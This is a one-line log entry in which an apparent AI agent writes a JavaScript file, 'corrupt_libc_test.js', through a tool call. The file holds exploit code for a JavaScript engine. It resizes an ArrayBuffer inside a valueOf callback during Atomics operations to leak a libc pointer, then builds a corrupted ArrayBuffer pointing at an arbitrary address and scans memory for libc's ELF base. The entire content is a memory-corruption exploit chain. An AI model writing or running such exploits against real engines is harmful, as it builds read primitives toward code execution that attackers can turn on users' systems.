2026-01-11 14:24:28,903 - INFO - Tool call: write_file({"file_path":"/tmp/work/corrupt_libc_test.js","content":"let keep=[];\n\nfunction makeCorruptedArrayBuffer(targetAddr, victimLen) {\n  let victim;\n  const rab = new ArrayBuffer(0x40, { maxByteLength: 0x2000000 });\n  const ta = new BigInt64Array(rab);\n  // fence chunk to prevent in-place realloc growth of rab->data\n  const fence = new ArrayBuffer(0x1000);\n  keep.push(fence);\n\n  const evil = {\n    valueOf() {\n      rab.resize(0x1000000); // should move, freeing old 0x40 chunk\n      victim = new ArrayBuffer(victimLen);\n      return targetAddr;\n    }\n  };\n\n  Atomics.store(ta, 2, evil);\n  return victim;\n}\n\nfunction leakLibcPtr() {\n  const oldLen = 0x5000;\n  const rab = new ArrayBuffer(oldLen, { maxByteLength: 0x2000000 });\n  const ta = new BigInt64Array(rab);\n  ta[0] = 0x4141414141414141n;\n  const evil = { valueOf(){ rab.resize(0x1000000); return 0n; } };\n  return Atomics.compareExchange(ta, 0, evil, 0n);\n}\n\nfunction findElfBase(dv, baseAddr, scanRange) {\n  const ELF = 0x464c457f;\n  for (let off = Number(scanRange); off >= 0; off -= 0x1000) {\n    if (dv.getUint32(off, true) === ELF) return baseAddr + BigInt(off);\n  }\n  return 0n;\n}\n\nconst leak = leakLibcPtr();\nprint('[*] leak=' + leak.toString(16));\nconst page = leak & ~0xfffn;\nconst scanRange = 0x300000n;\nconst base = page - scanRange;\nconst len = Number(scanRange + 0x100000n);\n\nconst ab = makeCorruptedArrayBuffer(base, len);\nconst dv = new DataView(ab);\nconst libcBase = findElfBase(dv, base, scanRange);\nprint('[*] found libcBase=' + libcBase.toString(16));\n"})
